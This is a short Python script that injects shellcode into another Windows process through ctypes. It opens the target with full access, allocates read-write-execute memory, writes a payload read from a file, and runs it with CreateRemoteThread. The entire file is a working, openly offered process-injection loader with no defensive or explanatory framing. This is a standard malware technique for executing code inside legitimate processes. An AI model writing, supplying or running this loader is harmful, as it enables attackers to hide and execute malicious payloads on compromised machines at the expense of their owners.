import ctypes  # Import the ctypes library for calling Windows API functions
import sys     # Import the sys library for command-line arguments
import os      # Import the os library for operating system related functions

# Constants for process access rights, memory allocation, and protection
PROCESS_ALL_ACCESS = 0x1F0FFF  # All possible access rights for a process
MEM_COMMIT = 0x1000            # Commit memory allocation
MEM_RESERVE = 0x2000           # Reserve memory allocation
PAGE_EXECUTE_READWRITE = 0x40  # Memory protection: can be read, written, and executed

# Define necessary Windows API functions
kernel32 = ctypes.windll.kernel32  # Access the kernel32.dll, which contains Windows API functions

def inject_shellcode(pid, shellcode):
    """
    Inject shellcode into a process identified by its process ID (PID).

    Parameters:
    pid (int): Process ID of the target process.
    shellcode (bytes): Shellcode to be injected.
    """
    # Open the target process with all access rights
    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        print(f"Failed to open process with PID {pid}")
        return False

    # Allocate memory in the target process
    memory_allocation = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not memory_allocation:
        print("Failed to allocate memory in the target process")
        kernel32.CloseHandle(process_handle)  # Close the handle to the process
        return False

    # Write the shellcode to the allocated memory
    bytes_written = ctypes.c_size_t(0)
    if not kernel32.WriteProcessMemory(process_handle, memory_allocation, shellcode, len(shellcode), ctypes.byref(bytes_written)):
        print("Failed to write shellcode to the target process memory")
        kernel32.VirtualFreeEx(process_handle, memory_allocation, 0, 0x8000)  # Free the allocated memory
        kernel32.CloseHandle(process_handle)  # Close the handle to the process
        return False

    # Create a remote thread in the target process to execute the shellcode
    thread_handle = kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation, None, 0, None)
    if not thread_handle:
        print("Failed to create remote thread in the target process")
        kernel32.VirtualFreeEx(process_handle, memory_allocation, 0, 0x8000)  # Free the allocated memory
        kernel32.CloseHandle(process_handle)  # Close the handle to the process
        return False

    # Wait for the remote thread to complete
    kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
    
    # Clean up handles
    kernel32.CloseHandle(thread_handle)
    kernel32.CloseHandle(process_handle)
    
    print("Shellcode injection successful")
    return True

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <PID> <shellcode_file>")
        sys.exit(1)

    pid = int(sys.argv[1])  # Get the process ID from command-line arguments
    shellcode_file = sys.argv[2]  # Get the shellcode file path from command-line arguments

    if not os.path.exists(shellcode_file):
        print(f"Shellcode file {shellcode_file} does not exist")
        sys.exit(1)

    # Read the shellcode from the file
    with open(shellcode_file, "rb") as f:
        shellcode = f.read()

    # Inject the shellcode into the target process
    if inject_shellcode(pid, shellcode):
        print("Shellcode injection completed successfully")
    else:
        print("Shellcode injection failed")
